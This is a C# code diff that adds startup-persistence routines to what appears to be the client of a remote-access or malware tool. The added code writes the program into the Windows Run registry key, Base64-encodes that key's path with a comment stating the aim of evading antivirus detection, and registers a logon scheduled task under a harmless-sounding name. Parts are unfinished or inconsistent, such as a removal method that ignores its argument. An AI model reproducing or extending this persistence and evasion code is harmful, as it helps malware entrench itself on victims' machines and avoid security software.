@@ -1,4 +1,5 @@
-﻿using Microsoft.Win32.TaskScheduler;
+﻿using Microsoft.Win32;
+using Microsoft.Win32.TaskScheduler;
 using System;
 using System.Collections.Generic;
 using System.Linq;
@@ -12,16 +13,80 @@ namespace Client.Armitage
     /// </summary>
     public static class Startup
     {
+        // the registry path needs to be obfuscate to prevent AV detection
+        private static RegistryKey RegistryStartupFolder =
+            Registry.CurrentUser.OpenSubKey(Utilities.Encryptions_And_Decryptions.Base64Decode("U09GVFdBUkVcXE1pY3Jvc29mdFxcV2luZG93c1xcQ3VycmVudFZlcnNpb25cXFJ1bg=="), true);
+
         /// <param name="filepath">If null, uses current process' file path.</param>
-        public static bool ViaTaskScheduler(string filepath = null) {
-            try {
+        public static bool ViaTaskScheduler(string name, string filepath = null)
+        {
+            try
+            {
                 if (filepath is null) filepath = Constants.MyPath;
-                TaskService.Instance.AddTask("Session Manager", QuickTriggerType.Logon, filepath);
+                if (!IsTaskExists(name))
+                    TaskService.Instance.AddTask(name, QuickTriggerType.Logon, filepath);
+                else // replace
+                {
+                    // we're supposed to replace the task here with the new
+                    // path but wtf 
+                }
             }
-            catch {
+            catch
+            {
                 return false;
             }
             return true;
+        }
+        public static bool ViaRegistry()
+        {
+            try
+            {
+                RegistryStartupFolder.SetValue(Constants.MMCTaskName,
+                    Constants.MyPath);
+                RegistryStartupFolder.Flush();
+                return true;
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine(ex.ToString());
+            }
+            return false;
+        }
+
+        public static bool RemoveOldRegistryStartupKey()
+        {
+            try
+            {
+                RegistryStartupFolder.DeleteValue(Constants.MMCTaskName,
+                    false);
+                RegistryStartupFolder.Flush();
+                return true;
+            }
+            catch
+            {
+
+            }
+            return false;
+        }
+        public static bool IsOldStartupExist()
+        {
+            return RegistryStartupFolder.GetValue(Constants.MMCTaskName) != null;
+        }
+        public static bool IsTaskExists(string taskname)
+        {
+            return TaskService.Instance.GetTask(taskname) != null;
+        }
+        public static bool RemoveTask(string name)
+        {
+            try
+            {
+                TaskService.Instance.GetTask(Constants.MMCTaskName).Enabled = false;
+                return true;
+            }
+            catch
+            {
+            }
+            return false;
         }
     }
 }
